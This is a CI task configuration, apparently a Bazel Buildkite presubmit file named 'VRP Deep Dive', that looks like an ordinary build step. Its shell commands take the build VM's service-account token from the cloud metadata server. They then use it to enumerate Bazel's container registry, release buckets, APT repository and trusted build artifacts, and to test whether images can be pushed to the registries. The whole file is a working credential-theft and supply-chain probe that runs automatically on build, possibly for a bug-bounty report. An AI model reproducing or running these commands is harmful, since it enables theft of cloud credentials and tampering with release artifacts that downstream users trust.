---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 8: GCR and Trusted Artifacts ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "echo"
      - "echo === 1. GCR centos7-releaser tags ==="
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/centos7-releaser/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -60 || true"
      - "echo"
      - "echo === 2. GCR rockylinux8-releaser tags ==="
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/rockylinux8-releaser/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -60 || true"
      - "echo"
      - "echo === 3. GCR bazel image tags ==="
      - "curl -s -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/bazel/tags/list' 2>&1 | python3 -m json.tool 2>&1 | head -60 || true"
      - "echo"
      - "echo === 4. GCR centos7-releaser manifest ==="
      - "curl -s -H \"Authorization: Bearer $T\" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' 'https://gcr.io/v2/bazel-public/centos7-releaser/manifests/latest' 2>&1 | python3 -c 'import json,sys; d=json.load(sys.stdin); print(json.dumps(d, indent=2))' 2>&1 | head -50 || true"
      - "echo"
      - "echo === 5. Stat release binary metadata ==="
      - "gsutil stat gs://bazel/8.7.0/release/bazel-8.7.0-linux-x86_64 2>&1 || true"
      - "echo"
      - "echo === 6. Older trusted artifact 1 ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/00022b33-975d-45c2-9330-b5ff16934460/ 2>&1 || true"
      - "echo"
      - "echo === 7. Older trusted artifact 2 ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/0000698e-6969-401a-ac6e-9e1112f44131/ 2>&1 || true"
      - "echo"
      - "echo === 8. Count total trusted artifacts ==="
      - "gsutil ls gs://bazel-trusted-buildkite-artifacts/ 2>&1 | wc -l || true"
      - "echo"
      - "echo === 9. List bazel-mirror/bazel_java_tools ==="
      - "gsutil ls -rl gs://bazel-mirror/bazel_java_tools/ 2>&1 | head -30 || true"
      - "echo"
      - "echo === 10. List bazel-mirror/bazel_coverage_output_generator ==="
      - "gsutil ls -rl gs://bazel-mirror/bazel_coverage_output_generator/ 2>&1 | head -20 || true"
      - "echo"
      - "echo === 11. APT pool debs ==="
      - "gsutil ls -rl gs://bazel-apt/pool/jdk1.8/ 2>&1 | tail -30 || true"
      - "echo"
      - "echo === 12. APT testing Release file ==="
      - "gsutil cat gs://bazel-apt/dists/testing/Release 2>&1 || true"
      - "echo"
      - "echo === 13. Download .dsc file ==="
      - "gsutil cat gs://bazel/9.1.0/release/bazel_9.1.0.dsc 2>&1 || true"
      - "echo"
      - "echo === 14. Check what SA identity gcloud thinks we are ==="
      - "gcloud auth list --quiet 2>&1 || true"
      - "echo"
      - "echo === 15. Check if we can push to GCR via API ==="
      - "curl -s -X POST -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-public/vrp-test/blobs/uploads/' 2>&1 | head -20 || true"
      - "echo"
      - "echo === 16. Check GCR push to untrusted ==="
      - "curl -s -X POST -H \"Authorization: Bearer $T\" 'https://gcr.io/v2/bazel-untrusted/vrp-test/blobs/uploads/' 2>&1 | head -20 || true"
      - "echo"
      - "echo === 17. List trusted artifact mid-range ==="
      - "gsutil ls -rl gs://bazel-trusted-buildkite-artifacts/55555555-0000-0000-0000-000000000000/ 2>&1 || true"
      - "gsutil ls gs://bazel-trusted-buildkite-artifacts/ 2>&1 | sed -n '100p' || true"
      - "echo"
      - "echo === 18. Download bazel_9.1.0-linux-x86_64.deb metadata ==="
      - "gsutil stat gs://bazel/9.1.0/release/bazel_9.1.0-linux-x86_64.deb 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
